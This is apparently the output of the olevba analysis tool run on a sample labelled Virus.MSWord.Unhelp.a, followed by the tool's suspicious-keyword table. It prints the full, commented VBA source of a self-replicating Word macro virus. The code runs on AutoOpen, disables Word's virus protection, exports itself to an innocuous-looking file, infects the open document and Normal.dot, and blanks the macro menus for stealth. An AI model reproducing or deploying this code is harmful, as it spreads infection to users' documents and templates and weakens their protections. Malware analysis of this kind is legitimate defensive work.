olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Unhelp.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Unhelp.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Helper.bas 
in file: Virus.MSWord.Unhelp.a - OLE stream: 'Macros/VBA/Helper'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoOpen()

' We hook the Word AutoOpen command to spread
' This virus will only spread on the "AutoOpen" of a document

On Error Resume Next
 
' Basic Error Handler - if there is an error just go to the next command
 
With Options
.ConfirmConversions = False
.VirusProtection = False
.SaveNormalPrompt = False
End With
 
' basic changes to keep the virus alive
 
Application.VBE.ActiveVBProject.VBComponents("Helper").Export "c:\startup.log"

' to comply with the SR-1 changes we must export our .bas file because
' copying it no longer works
' The exported .bas file can be called anything - I call it startup.log
' because that filename does not look suspicious

For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "Helper" Then NormInstall = True
Next I
 
' We look in the Normal.dot to see if our module "Helper" exists
' if so NormInstall = True if not NormInstall = False

For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "Helper" Then ActivInstall = True
Next I

' We look in the ActiveDocument to see if our module "Helper" exists
' if so ActivInstall = True if not ActivInstall = False

If ActivInstall = False Then
With ActiveDocument.VBProject
With .VBComponents.Import("c:\startup.log")
End With
End With
End If
 
' If ActivInstall = False (we are not installed in the current document)
' Then we must now import our .bas file and infect the current document
 
If NormInstall = False Then
With NormalTemplate.VBProject
With .VBComponents.Import("c:\startup.log")
End With
End With

' If NormInstall = False (we are not installed in the Normal.dot)
' Then we must now import our .bas file and infect the Normal.dot

End If
 
If ActivInstall = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument

' If we were not in the current document then save the document now that
' the virus is installed

If NormInstall = False Then
If NormalTemplate.Saved = False Then NormalTemplate.Save
End If

' If we were not in the normal.dot then save the normal.dot now that
' the virus is installed

End Sub
Sub ViewVBCode()
' basic stealth - just disables the menus
End Sub
Sub FileTemplates()
' basic stealth - just disables the menus
End Sub
Sub ToolsMacro()
' basic stealth - just disables the menus
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

